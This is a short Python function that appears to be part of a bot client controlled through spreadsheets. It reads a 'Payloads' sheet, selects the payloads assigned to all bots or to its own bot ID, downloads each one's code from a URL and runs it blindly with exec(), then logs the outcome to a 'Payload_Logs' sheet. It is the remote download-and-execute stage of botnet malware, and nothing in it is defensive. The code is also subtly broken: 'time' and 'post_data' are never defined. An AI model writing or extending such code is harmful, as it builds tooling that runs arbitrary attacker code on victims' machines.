import requests, subprocess
from core.sheets_api import read_sheet, append_to_sheet

def run_payload(bot_id, sheet_url="Payloads"):
    payloads = read_sheet("Payloads")
    append_to_sheet("Payload_Logs", ["BotID", "PayloadID", "Status", "Timestamp"])
    for p in payloads[1:]:
        if p[3].lower() == "yes" and (p[2] in ["ALL", bot_id]):
            try:
                code = requests.get(p[1]).text
                exec(code)
                post_data("Payload_Logs", {
                    "BotID": bot_id,
                    "PayloadID": p[0],
                    "Status": "Success",
                    "Timestamp": time.ctime()
                }, sheet_url)
            except Exception as e:
                post_data("Payload_Logs", {
                    "BotID": bot_id,
                    "PayloadID": p[0],
                    "Status": f"Failed: {str(e)}",
                    "Timestamp": time.ctime()
                }, sheet_url)
